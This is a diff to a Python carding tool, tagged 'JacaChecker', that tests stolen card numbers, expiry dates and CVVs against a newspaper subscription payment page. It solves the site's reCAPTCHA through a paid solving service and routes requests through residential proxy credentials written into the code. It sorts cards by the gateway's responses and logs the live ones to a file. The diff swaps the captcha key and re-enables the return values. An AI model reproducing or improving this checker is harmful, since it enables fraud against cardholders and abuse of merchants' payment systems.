@@ -25,7 +25,7 @@ def criarTask():
         "task": {
             "type": "RecaptchaV2TaskProxyless",
             "websiteURL": "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp",
-            "websiteKey": "6Lcb5mcaAAAAAOOmjTu_EvLbKXpFw8xBO-jDg0Sf",
+            "websiteKey": "6LeF47cUAAAAAMbDh0XxUukTdBNNF8xjOvWJ5Xtc",
         },
     }
     criar = requests.post(
@@ -132,7 +132,7 @@ def checker(card, month, year, cvv):
         
         if response.status_code == 200:
             time.sleep(5)
-            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
+            p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
             start_time = time.time() 
 
 
@@ -224,57 +224,57 @@ def checker(card, month, year, cvv):
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS [{MSegundos}] MS"                          
                 open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} avs  [{MSegundos}] #JacaChecker\n")
                 print(Fore.GREEN + f"{x} #JacaChecker")     
-                #return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
             
             elif 'Insufficient funds' in response.text:
                 bin = api_bin(card[:6])              
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [{MSegundos}] MS"                          
                 open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
                 print(Fore.GREEN + f"{x} #JacaChecker") 
-                #return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                 
             elif 'Unidentifiable error issuer generated' in response.text:
                 bin = api_bin(card[:6])              
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [{MSegundos}] MS"                          
                 open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                 print(Fore.GREEN + f"{x} #JacaChecker") 
-                #return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                     
             elif 'expired' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card Expired [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
                                         
             elif 'The specified account was not found' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Not Found [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"} 
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"} 
                 
             elif 'The account number failed to pass the LUHN' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Invalid Card [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                 
             elif 'Do not honor' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Do Not Honor [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                 
             elif 'Issuer has flagged this account as fraudulent' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Suspected Fraud [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                 
             elif 'Card has been restricted' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card has been restricted [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                 
             else:
                 
